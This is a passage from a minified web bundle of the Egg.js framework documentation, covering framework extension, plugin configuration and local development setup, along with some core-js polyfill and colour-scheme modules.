Koa."),r.a.createElement("h3",{id:"access-method-1"},r.a.createElement(l["AnchorLink"],{to:"#access-method-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Access Method"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this")," in middleware is ctx, such as ",r.a.createElement("code",null,"this.cookies.get('foo')"),"\u3002"),r.a.createElement("li",null,"There are two different ways to write controller. If you use class to describe controller, you can use ",r.a.createElement("code",null,"this.ctx")," to access Context. Or if you write as method, you can access Context with ",r.a.createElement("code",null,"ctx")," directly."),r.a.createElement("li",null,r.a.createElement("code",null,"this")," in helper, service points to the helper object and service object themselves. Simply use ",r.a.createElement("code",null,"this.ctx")," to access Context object, such as ",r.a.createElement("code",null,"this.ctx.cookies.get('foo')"),".")),r.a.createElement("h3",{id:"how-to-extend-1"},r.a.createElement(l["AnchorLink"],{to:"#how-to-extend-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to extend"),r.a.createElement("p",null,"Egg will merge the object defined in ",r.a.createElement("code",null,"app/extend/context.js")," with the prototype of Context object in Koa. And it will generate a ",r.a.createElement("code",null,"ctx")," object which is based on the extended prototype when deal with request."),r.a.createElement("h4",{id:"extend-methods-1"},r.a.createElement(l["AnchorLink"],{to:"#extend-methods-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Methods"),r.a.createElement("p",null,"For instance, we could add a method ",r.a.createElement("code",null,"ctx.foo()")," in the following way:"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nmodule.exports = {\n  foo(param) {\n    // `this` points to the ctx object, you can access other methods or property of ctx\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"extend-properties-1"},r.a.createElement(l["AnchorLink"],{to:"#extend-properties-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Properties"),r.a.createElement("p",null,"Generally speaking, the calculation of properties only need to do once, therefore we have to do some cache, otherwise it will degrade performance of the app as too much calculation would be going to do when access those properties several times."),r.a.createElement("p",null,"So, it's recommended to use Symbol + Getter."),r.a.createElement("p",null,"For example, if we would like to add a Getter property ",r.a.createElement("code",null,"ctx.bar"),":"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nconst BAR = Symbol('Context#bar');\n\nmodule.exports = {\n  get bar() {\n    // `this` points to the ctx object, you can access other methods or property of ctx\n    if (!this[BAR]) {\n      // For example, we can get from header, but it should be more complex in real situation.\n      this[BAR] = this.get('x-bar');\n    }\n    return this[BAR];\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"request"},r.a.createElement(l["AnchorLink"],{to:"#request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Request"),r.a.createElement("p",null,"Request object is the same as that in Koa, which is a ",r.a.createElement("strong",null,"Request Level")," object. It provides a great number of methods to help to access the properties and methods you need."),r.a.createElement("h3",{id:"access-method-2"},r.a.createElement(l["AnchorLink"],{to:"#access-method-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Access Method"),r.a.createElement(o["a"],{code:"ctx.request;",lang:"js"}),r.a.createElement("p",null,"So many properties and methods in ",r.a.createElement("code",null,"ctx")," can also be accessed in ",r.a.createElement("code",null,"request")," object. For those properties and methods, it is just the same to access them by using either ",r.a.createElement("code",null,"ctx")," or ",r.a.createElement("code",null,"request"),", such as ",r.a.createElement("code",null,"ctx.url === ctx.request.url"),"."),r.a.createElement("p",null,"Here are the properties and methods in ",r.a.createElement("code",null,"ctx")," which can also be accessed by Request aliases: ",r.a.createElement(l["Link"],{to:"http://koajs.com/#request-aliases"},"Koa - Request aliases")),r.a.createElement("h3",{id:"how-to-extend-2"},r.a.createElement(l["AnchorLink"],{to:"#how-to-extend-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Extend"),r.a.createElement("p",null,"Egg will merge the object defined in ",r.a.createElement("code",null,"app/extend/request.js")," and the prototype of ",r.a.createElement("code",null,"request")," object built in egg. And it will generate a ",r.a.createElement("code",null,"request")," object which is based on the extended prototype when deal with request."),r.a.createElement("p",null,"For instance, we could add a property ",r.a.createElement("code",null,"request.foo")," in the following way:"),r.a.createElement(o["a"],{code:"// app/extend/request.js\nmodule.exports = {\n  get foo() {\n    return this.get('x-request-foo');\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"response"},r.a.createElement(l["AnchorLink"],{to:"#response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Response"),r.a.createElement("p",null,"Response object is the same as that in Koa, which is a ",r.a.createElement("strong",null,"Request Level")," object. It provides a great number of methods to help to access the properties and methods you need."),r.a.createElement("h3",{id:"access-method-3"},r.a.createElement(l["AnchorLink"],{to:"#access-method-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Access Method"),r.a.createElement(o["a"],{code:"ctx.response;",lang:"js"}),r.a.createElement("p",null,"So many properties and methods in ",r.a.createElement("code",null,"ctx")," can also be accessed in ",r.a.createElement("code",null,"response")," object. For those properties and methods, it is just the same to access them by using either ",r.a.createElement("code",null,"ctx")," or ",r.a.createElement("code",null,"response"),". For example ",r.a.createElement("code",null,"ctx.status = 404")," is the same as ",r.a.createElement("code",null,"ctx.response.status = 404"),"."),r.a.createElement("p",null,"Here are the properties and methods in ",r.a.createElement("code",null,"ctx")," which can also be accessed by Response aliases: ",r.a.createElement(l["Link"],{to:"http://koajs.com/#response-aliases"},"Koa Response aliases")),r.a.createElement("h3",{id:"how-to-extend-3"},r.a.createElement(l["AnchorLink"],{to:"#how-to-extend-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Extend"),r.a.createElement("p",null,"Egg will merge the object defined in ",r.a.createElement("code",null,"app/extend/response.js")," and the prototype of ",r.a.createElement("code",null,"response")," object build in egg. And it will generate a ",r.a.createElement("code",null,"response")," object which is based on the extended prototype after dealt with request."),r.a.createElement("p",null,"For instance, we could add a setter ",r.a.createElement("code",null,"request.foo")," in the following way:"),r.a.createElement(o["a"],{code:"// app/extend/response.js\nmodule.exports = {\n  set foo(value) {\n    this.set('x-response-foo', value);\n  },\n};",lang:"js"}),r.a.createElement("p",null,"Then we can use the setter like this: ",r.a.createElement("code",null,"this.response.foo = 'bar';")),r.a.createElement("h2",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Function Helper can provides some useful utility functions."),r.a.createElement("p",null,"We can put some utility functions we use ofter into helper.js as an individual function. Then we can write the complex codes in JavaScript, avoiding to write them everywhere. Besides, such a simple function like Helper allows to write test case much easier."),r.a.createElement("p",null,"Egg has had some build-in Helper functions. We can write our own Helper as well."),r.a.createElement("h3",{id:"access-method-4"},r.a.createElement(l["AnchorLink"],{to:"#access-method-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Access Method"),r.a.createElement("p",null,"Access helper object with ",r.a.createElement("code",null,"ctx.helper"),", for example:"),r.a.createElement(o["a"],{code:"// Assume that home router has already defined in app/router.js\napp.get('home', '/', 'home.index');\n\n// Use helper to calculate the specific url path\nctx.helper.pathFor('home', { by: 'recent', limit: 20 });\n// => /?by=recent&limit=20",lang:"js"}),r.a.createElement("h3",{id:"how-to-extend-4"},r.a.createElement(l["AnchorLink"],{to:"#how-to-extend-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Extend"),r.a.createElement("p",null,"Egg will merge the object defined in ",r.a.createElement("code",null,"app/extend/helper.js")," and the prototype of ",r.a.createElement("code",null,"helper")," object build in egg. And it will generate a ",r.a.createElement("code",null,"helper")," object which is based on the extended prototype after dealt with request."),r.a.createElement("p",null,"For instance, we could add a method ",r.a.createElement("code",null,"helper.foo()")," in the following way:"),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nmodule.exports = {\n  foo(param) {\n    // // `this` points to the helper object, you can access other methods or property of helper\n    // this.ctx => context object\n    // this.app => application object\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"extend-according-to-environment"},r.a.createElement(l["AnchorLink"],{to:"#extend-according-to-environment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend according to environment"),r.a.createElement("p",null,"Besides, we can extend the framework in an optional way according to the environment. For example, if you want ",r.a.createElement("code",null,"mockXX()")," only be able to accessed when doing unittest:"),r.a.createElement(o["a"],{code:"// app/extend/application.unittest.js\nmodule.exports = {\n  mockXX(k, v) {},\n};",lang:"js"}),r.a.createElement("p",null,"This file will only be required under unittest environment."),r.a.createElement("p",null,"Similarly, we could extend egg in this way for other object,such as Application, Context, Request, Response and Helper. See more on ",r.a.createElement(l["Link"],{to:"./env"},"environment"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},BD8q:function(e,t,n){"use strict";var a=n("0mt+"),r=n("x781"),l=n("m/os"),o=n("N0Us"),i=n("SCbZ"),c=n("HmG0");a({target:"Array",proto:!0},{flat:function(){var e=arguments.length?arguments[0]:void 0,t=l(this),n=o(t.length),a=c(t,0);return a.length=r(a,t,t,n,0,void 0===e?1:i(e)),a}})},BHsG:function(e,t,n){var a=n("qXUs");function r(e,t){if(e){if("string"===typeof e)return a(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?a(e,t):void 0}}e.exports=r,e.exports.__esModule=!0,e.exports["default"]=e.exports},BHsk:function(e,t,n){var a=n("u9el");a("Int16",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},BOmv:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("Yftc"),o=n("4bQT"),i=n("tbdv"),c=n("u3TI"),s=n("aGbw"),u=n("NBU9"),d=n("XExY"),m=n("lz/I"),p=m.set,h=m.getterFor("AggregateError"),g=function(e,t){var n=this;if(!(n instanceof g))return new g(e,t);o&&(n=o(new Error(t),l(n)));var a=[];return u(e,a.push,a),r?p(n,{errors:a,type:"AggregateError"}):n.errors=a,void 0!==t&&d(n,"message",String(t)),n};g.prototype=i(Error.prototype,{constructor:s(5,g),message:s(5,""),name:s(5,"AggregateError")}),r&&c.f(g.prototype,"errors",{get:function(){return h(this).errors},configurable:!0}),a({global:!0},{AggregateError:g})},BW8W:function(e,t,n){},BZjo:function(e,t,n){var a=n("m4/z"),r=n("AAg8");e.exports=a?r:function(e){return Set.prototype.values.call(e)}},BcEE:function(e,t,n){"use strict";var a=n("uaw7")["default"],r=n("EhH2")["default"];function l(){var e=n("FU0I");return l=function(){return e},e}function o(e,t){return d(e)||u(e,t)||c(e,t)||i()}function i(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e,t){if(e){if("string"===typeof e)return s(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?s(e,t):void 0}}function s(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function u(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function d(e){if(Array.isArray(e))return e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var m,p="data-prefers-color",h="dumi:prefers-color",g=function(){function e(){var t=this;a(this,e),this.color=void 0,this.callbacks=[],this.color=localStorage.getItem(h)||document.documentElement.getAttribute(p),["light","dark"].forEach((function(e){var n=t.getColorMedia(e),a=function(n){n.matches&&"auto"===t.color&&(document.documentElement.setAttribute(p,e),t.applyCallbacks())};n.addEventListener?n.addEventListener("change",a):n.addListener&&n.addListener(a)}))}return r(e,[{key:"getColorMedia",value:function(e){return window.matchMedia("(prefers-color-scheme: ".concat(e,")"))}},{key:"isColorMode",value:function(e){return this.getColorMedia(e).matches}},{key:"applyCallbacks",value:function(){var e=this;this.callbacks.forEach((function(t){return t(e.color)}))}},{key:"listen",value:function(e){this.callbacks.push(e)}},{key:"unlisten",value:function(e){this.callbacks.splice(this.callbacks.indexOf(e),1)}},{key:"set",value:function(e){return this.color=e,localStorage.setItem(h,e),this.applyCallbacks(),"auto"===e?document.documentElement.setAttribute(p,this.isColorMode("dark")?"dark":"light"):document.documentElement.setAttribute(p,e),e}}]),e}(),f=function(){var e=(0,l().useState)(),t=o(e,2),n=t[0],a=t[1],r=(0,l().useCallback)((function(e){m.set(e)}),[]);return(0,l().useEffect)((function(){return m=m||new g,m.listen(a),a(m.color),function(){return m.unlisten(a)}}),[]),[n,r]};t["default"]=f},Bcn0:function(e,t,n){"use strict";var a=n("9Rcy"),r=n("QiLd"),l=n("m/os"),o=n("N0Us"),i=n("u3TI").f;a&&!("lastItem"in[])&&(i(Array.prototype,"lastItem",{configurable:!0,get:function(){var e=l(this),t=o(e.length);return 0==t?void 0:e[t-1]},set:function(e){var t=l(this),n=o(t.length);return t[0==n?0:n-1]=e}}),r("lastItem"))},Bf0c:function(e,t,n){n("cDb8")},Bn3C:function(e,t,n){"use strict";var a={foo:{}},r=Object;e.exports=function(){return{__proto__:a}.foo===a.foo&&!({__proto__:null}instanceof r)}},BnjQ:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Plugin mechanism is a major feature of our framework. Not only can it ensure that the core of the framework is sufficiently streamlined, stable and efficient, but also can promote the reuse of business logic and the formation of an ecosystem. In the following sections, we will try to answer questions such as"),r.a.createElement("ul",null,r.a.createElement("li",null,"Koa already has a middleware mechanism, why plugins?"),r.a.createElement("li",null,"What are the differences/relationship between middleware and plugins?"),r.a.createElement("li",null,"How do I use a plugin?"),r.a.createElement("li",null,"How do I write a plugin?"),r.a.createElement("li",null,"...")),r.a.createElement("h2",{id:"why-plugins"},r.a.createElement(l["AnchorLink"],{to:"#why-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Why plugins?"),r.a.createElement("p",null,"Here are some of the issues we think that can arise when using Koa middleware:"),r.a.createElement("ol",null,r.a.createElement("li",null,"Middleware loading is sequential and it is the user's responsibility to setup the execution sequence since middleware mechanism can not manage the actual order. This, in fact, is not very friendly. When the order is not correct, it can lead to unexpected results."),r.a.createElement("li",null,"Middleware positioning is geared towards intercepting user requests to add additional logic before or after such as: authentication, security checks, logging and so on. However, in some cases, such functionality can be unrelated to the request, for example, timing tasks, message subscriptions, back-end logic and so on."),r.a.createElement("li",null,"Some features include very complex initialization logic that needs to be done at application startup. This is obviously not suitable for middleware to achieve.")),r.a.createElement("p",null,"To sum up, we need a more powerful mechanism to manage, orchestrate those relatively independent business logic."),r.a.createElement("h3",{id:"the-relationship-between-middleware-plugins-and-application"},r.a.createElement(l["AnchorLink"],{to:"#the-relationship-between-middleware-plugins-and-application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"The Relationship Between Middleware, Plugins and Application"),r.a.createElement("p",null,'A plugin is actually a "mini-application", almost the same as an app:'),r.a.createElement("ul",null,r.a.createElement("li",null,"It contains ",r.a.createElement(l["Link"],{to:"./service"},"Services"),", ",r.a.createElement(l["Link"],{to:"./middleware"},"middleware"),", ",r.a.createElement(l["Link"],{to:"./config"},"config"),", ",r.a.createElement(l["Link"],{to:"./extend"},"framework extensions"),", etc."),r.a.createElement("li",null,"It does not have separate ",r.a.createElement(l["Link"],{to:"./router"},"Router")," and ",r.a.createElement(l["Link"],{to:"./controller"},"Controller"),"."),r.a.createElement("li",null,"It does not have ",r.a.createElement("code",null,"plugin.js"),", it could only define dependencies with others, but could not deside whether other plugin is enable or not.")),r.a.createElement("p",null,"Their relationship is:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Applications can be directly introduced into Koa's middleware."),r.a.createElement("li",null,"When it comes to the scene mentioned in the previous section, the app needs to import the plugin."),r.a.createElement("li",null,"The plugin itself can contain middleware."),r.a.createElement("li",null,"Multiple plugins can be wrapped as an ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"upper frame"),".")),r.a.createElement("h2",{id:"using-plugins"},r.a.createElement(l["AnchorLink"],{to:"#using-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Plugins"),r.a.createElement("p",null,"Plugins are usually added via the npm module:"),r.a.createElement(o["a"],{code:"$ npm i egg-mysql --save",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: We recommend introducing dependencies in the ",r.a.createElement("code",null,"^")," way, and locking versions are strongly discouraged.")),r.a.createElement(o["a"],{code:'{\n  "dependencies": {\n    "egg-mysql": "^ 3.0.0"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"Then you need to declare it in the ",r.a.createElement("code",null,"config / plugin.js")," application or framework:"),r.a.createElement(o["a"],{code:"// config / plugin.js\n// Use mysql plugin\nexports.mysql = {\n  enable: true,\n  package: 'egg-mysql',\n};",lang:"js"}),r.a.createElement("p",null,"You can directly use the functionality provided by the plugin:"),r.a.createElement(o["a"],{code:"app.mysql.query(sql, values);",lang:"js"}),r.a.createElement("h3",{id:"configuring-plugins"},r.a.createElement(l["AnchorLink"],{to:"#configuring-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuring Plugins"),r.a.createElement("p",null,"Each configuration item in ",r.a.createElement("code",null,"plugin.js")," supports:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," enable")," - Whether to enable this plugin, the default is true"),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," package")," -",r.a.createElement("code",null,"npm")," module name, plugin is imported via ",r.a.createElement("code",null,"npm")," module"),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," path")," - The plugin's absolute path, mutually exclusive with package configuration"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Array","}"," env")," - Only enable plugin in the specified runtime (environment), overriding the plugin's own configuration in ",r.a.createElement("code",null,"package.json"))),r.a.createElement("h3",{id:"enablingdisabling-plugins"},r.a.createElement(l["AnchorLink"],{to:"#enablingdisabling-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Enabling/Disabling plugins"),r.a.createElement("p",null,"The application does not need the package or path configuration when using the plugins built in the upper framework. You only need to specify whether they are enabled or not:"),r.a.createElement(o["a"],{code:"// For the built-in plugin, you can use the following simple way to turn on or off\nexports.onerror = false;",lang:"js"}),r.a.createElement("h3",{id:"environment-configuration"},r.a.createElement(l["AnchorLink"],{to:"#environment-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Environment Configuration"),r.a.createElement("p",null,"We also support ",r.a.createElement("code",null,"plugin.","{","Env","}",".js"),", which will load plugin configurations based on ",r.a.createElement(l["Link"],{to:"../basics/env"},"Runtime"),"."),r.a.createElement("p",null,"For example, if you want to load the plugin ",r.a.createElement("code",null,"egg-dev")," only in the local environment, you can install it to ",r.a.createElement("code",null,"devDependencies")," and adjust the plugin configuration accordingly."),r.a.createElement(o["a"],{code:'// npm i egg-dev --save-dev\n// package.json\n{\n\xa0\xa0"devDependencies": {\n\xa0\xa0\xa0\xa0"egg-dev": "*"\n\xa0\xa0}\n}',lang:"js"}),r.a.createElement("p",null,"Then declare in ",r.a.createElement("code",null,"plugin.local.js"),":"),r.a.createElement(o["a"],{code:"// config / plugin.local.js\nexports.dev = {\n  enable: true,\n  package: 'egg-dev',\n};",lang:"js"}),r.a.createElement("p",null,"In this way, ",r.a.createElement("code",null,"npm i --production")," in the production environment does not need to download the",r.a.createElement("code",null,"egg-dev")," package."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"plugin.default.js")," does not exists. Use ",r.a.createElement("code",null,"local")," for dev environments.")),r.a.createElement("li",null,r.a.createElement("p",null,"Use this feature only in the application layer. Do not use it in the framework layer."))),r.a.createElement("h3",{id:"package-name-and-path"},r.a.createElement(l["AnchorLink"],{to:"#package-name-and-path","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Package Name and Path"),r.a.createElement("ul",null,r.a.createElement("li",null,"The ",r.a.createElement("code",null,"package")," is introduced in the ",r.a.createElement("code",null,"npm")," style which is the most common way to import"),r.a.createElement("li",null,r.a.createElement("code",null,"path")," is an absolute path introduced when you want to load the plugin from different location such as when a plugin is still at the development stage or not available on ",r.a.createElement("code",null,"npm")),r.a.createElement("li",null,"To see the application of these two scenarios, please see ",r.a.createElement(l["Link"],{to:"../intro/progressive"},"progressive development"),".")),r.a.createElement(o["a"],{code:"// config / plugin.js\nconst path = require('path');\nexports.mysql = {\n  enable: true,\n  path: path.join(__dirname, '../lib/plugin/egg-mysql'),\n};",lang:"js"}),r.a.createElement("h2",{id:"plugin-configuration"},r.a.createElement(l["AnchorLink"],{to:"#plugin-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Configuration"),r.a.createElement("p",null,"The plugin will usually contain its own default configuration, you can overwrite this in ",r.a.createElement("code",null,"config.default.js"),":"),r.a.createElement(o["a"],{code:"// config / config.default.js\nexports.mysql = {\n  client: {\n    host: 'mysql.com',\n    port: '3306',\n    user: 'test_user',\n    password: 'test_password',\n    database: 'test',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"Specific consolidation rules can be found in ",r.a.createElement(l["Link"],{to:"./config"},"Configuration"),"."),r.a.createElement("h2",{id:"plugin-list"},r.a.createElement(l["AnchorLink"],{to:"#plugin-list","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin List"),r.a.createElement("ul",null,r.a.createElement("li",null,"Framework has default built-in plugins for enterprise applications ",r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/plugins/"},"Common plugins"),": \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-onerror"},"onerror")," Uniform Exception Handling \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session"},"Session")," Session implementation \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-i18n"},"i18n")," Multilingual \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-watcher"},"watcher")," File and folder monitoring \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart"},"multipart")," File Streaming Upload \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"security")," Security \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development"},"development")," Development Environment Configuration \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logrotator"},"logrotator")," Log segmentation \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-schedule"},"schedule")," Timing tasks \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"static")," Static server \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-jsonp"},"jsonp")," jsonp support \xa0\xa0- ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"view")," Template Engine"),r.a.createElement("li",null,"More community plugins can be found on GitHub ",r.a.createElement(l["Link"],{to:"https://github.com/topics/egg-plugin"},"egg-plugin"),".")),r.a.createElement("h2",{id:"developing-a-plugin"},r.a.createElement(l["AnchorLink"],{to:"#developing-a-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Developing a Plugin"),r.a.createElement("p",null,"See the documentation ",r.a.createElement(l["Link"],{to:"../advanced/plugin"},"plugin development"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},Bscc:function(e,t,n){"use strict";var a=n("dxz4"),r=n("xyr1");e.exports=a("Map",(function(e){return function(){return e(this,arguments.length?arguments[0]:void 0)}}),r)},BtsT:function(e,t,n){"use strict";e.exports=function(e,t){for(var n={},a=Object.keys(e),r=Array.isArray(t),l=0;l<a.length;l++){var o=a[l],i=e[o];(r?-1!==t.indexOf(o):t(o,i,e))&&(n[o]=i)}return n}},BxTA:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"We provide convenient ways for development, debugging, and unit tests to improve your development experience."),r.a.createElement("p",null,"Here, we need to use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-bin"},"egg-bin")," module (Only used in local development and unit tests. For production environment, please refer to ",r.a.createElement(l["Link"],{to:"./deployment"},"Deployment"),")."),r.a.createElement("p",null,"First of all, we need to include ",r.a.createElement("code",null,"egg-bin")," module in ",r.a.createElement("code",null,"devDependencies"),":"),r.a.createElement(o["a"],{code:"$ npm i egg-bin --save-dev",lang:"bash"}),r.a.createElement("h2",{id:"start-app"},r.a.createElement(l["AnchorLink"],{to:"#start-app","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Start App"),r.a.createElement("p",null,"Once we have modified code and saved in local development, the app will restart automatically, and our changes will take place right after that."),r.a.createElement("h3",{id:"adding-script"},r.a.createElement(l["AnchorLink"],{to:"#adding-script","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Script"),r.a.createElement("p",null,"Add ",r.a.createElement("code",null,"npm scripts")," into ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": "egg-bin dev"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"And then we may start app by ",r.a.createElement("code",null,"npm run dev"),"."),r.a.createElement("h3",{id:"environment-configuration"},r.a.createElement(l["AnchorLink"],{to:"#environment-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Environment Configuration"),r.a.createElement("p",null,"To start app in local, environment needs to be set as ",r.a.createElement("code",null,"env: local"),". The configuration comes from the combination of both ",r.a.createElement("code",null,"config.local.js")," and ",r.a.createElement("code",null,"config.default.js"),"."),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Note: The local development environment relies on 'egg-development' module, enabled by default, and closed other environment, Configuration reference ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development/blob/master/config/config.default.js"},"config/config.default.js"))),r.a.createElement("h3",{id:"about-reload"},r.a.createElement(l["AnchorLink"],{to:"#about-reload","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"About ",r.a.createElement("code",null,"Reload")),r.a.createElement("p",null,"Under the following directory (including subdirectories) will watch file changes under development environment by default, trigger an Egg development environment server reload:"),r.a.createElement("ul",null,r.a.createElement("li",null,"$","{","app_root","}","/app"),r.a.createElement("li",null,"$","{","app_root","}","/config"),r.a.createElement("li",null,"$","{","app_root","}","/mocks"),r.a.createElement("li",null,"$","{","app_root","}","/mocks_proxy"),r.a.createElement("li",null,"$","{","app_root","}","/app.js")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"set ",r.a.createElement("code",null,"config.development.overrideDefault")," to ",r.a.createElement("code",null,"true")," to skip defaults merge.")),r.a.createElement("p",null,"Under the following directory (including subdirectories) will ignore file changes under development environment by default:"),r.a.createElement("ul",null,r.a.createElement("li",null,"$","{","app_root","}","/app/view"),r.a.createElement("li",null,"$","{","app_root","}","/app/assets"),r.a.createElement("li",null,"$","{","app_root","}","/app/public"),r.a.createElement("li",null,"$","{","app_root","}","/app/web")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"set ",r.a.createElement("code",null,"config.development.overrideIgnore")," to ",r.a.createElement("code",null,"true")," to skip defaults merge.")),r.a.createElement("h3",{id:"port-assignment"},r.a.createElement(l["AnchorLink"],{to:"#port-assignment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Port Assignment"),r.a.createElement("p",null,"Starting app in local will listen to port 7001 by default. You may assign other port to it like this:"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": 